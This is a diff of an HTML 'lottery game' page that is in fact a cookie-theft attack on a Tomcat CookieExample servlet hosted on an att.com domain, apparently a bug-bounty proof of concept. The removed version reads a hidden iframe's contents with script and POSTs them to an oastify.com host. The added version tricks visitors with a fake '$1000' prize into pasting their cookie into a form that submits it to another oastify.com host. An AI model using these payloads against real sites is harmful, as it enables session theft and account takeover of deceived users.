@@ -9,31 +9,16 @@
 </head>
 <body>
   <h1>LOTTERY GAME</h1>
-  <h2>Instructions<br>
-  COPY THE TEXT BELOW
-  </h2>
+  <h2>Instructions: COPY THE TEXT BELOW</h2>
 
-<iframe id="leak" 
-  src="https://cpr.att.com:8443/examples/servlets/servlet/CookieExample" 
-  style="width:0;height:0;border:0;display:none;"></iframe>
+  <iframe id="fgframe" height="650px" width="400px"
+          src="https://cpr.att.com:8443/examples/servlets/servlet/CookieExample">
+  </iframe>
 
-<script>
-setTimeout(() => {
-  try {
-    const iframe = document.getElementById('leak');
-    const doc = iframe.contentDocument || iframe.contentWindow.document;
-    const bodyText = doc.body.innerText;
-
-    fetch("https://0z0djxrh54pkuxoponuteqy3uu0lodc2.oastify.com", {
-      method: "POST",
-      mode: "no-cors",
-      body: bodyText
-    });
-  } catch (e) {
-    console.error("Failed to read iframe contents:", e);
-  }
-}, 2000);
-</script>
-
+  <form action="https://pg920m86mt69bm5e5cbivffsbjha54tt.oastify.com" method="POST">
+    <label for="cookie">PASTE THE MAGIC CODE HERE</label><br>
+    <textarea id="cookie" name="cookie" rows="4" cols="50"></textarea><br>
+    <button>click to win 1000$!</button>
+  </form>
 </body>
 </html>
